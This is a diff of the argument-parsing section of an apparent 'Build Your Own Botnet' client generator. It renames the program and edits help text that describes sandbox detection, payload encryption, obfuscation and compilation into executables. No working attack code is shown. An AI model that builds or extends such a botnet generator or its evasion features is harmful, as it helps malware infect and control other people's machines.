@@ -54,6 +54,7 @@ Generate clients with the following features:
         client will abort execution if a virtual machine
         or sandbox is detected
 """
+
 # standard library
 import os
 import sys
@@ -101,9 +102,9 @@ def main():
     """ 
     Parse command-line arguments and run the client generator
 
-    usage: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
-                     [--encrypt] [--obfuscate] [--compress] [--compile]
-                     host port [modules [modules ...]]
+    usage: generators.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
+                         [--encrypt] [--obfuscate] [--compress] [--compile]
+                         host port [modules [modules ...]]
 
     positional arguments:
       host            server IP address
@@ -119,12 +120,14 @@ def main():
       --encrypt       encrypt payload and embed key in stager
       --obfuscate     obfuscate names of classes, functions & variables
       --compress      zip-compress into a self-executing python script
-      --exe           compile into a standalone executable
-      --app           bundle into standalone application
+      --exe           compile into a standalone executable (Windows, Linux)
+      --app           bundle into standalone application (Mac OS X)
 
     """
+
     util.display(globals()['__banner'], color=random.choice(filter(str.isupper, dir(colorama.Fore))), style='bright')
-    parser = argparse.ArgumentParser(prog='client.py', 
+
+    parser = argparse.ArgumentParser(prog='generator.py', 
                                     version='0.1.5',
                                     description="Client Generator (Build Your Own Botnet)")
     parser.add_argument('host',
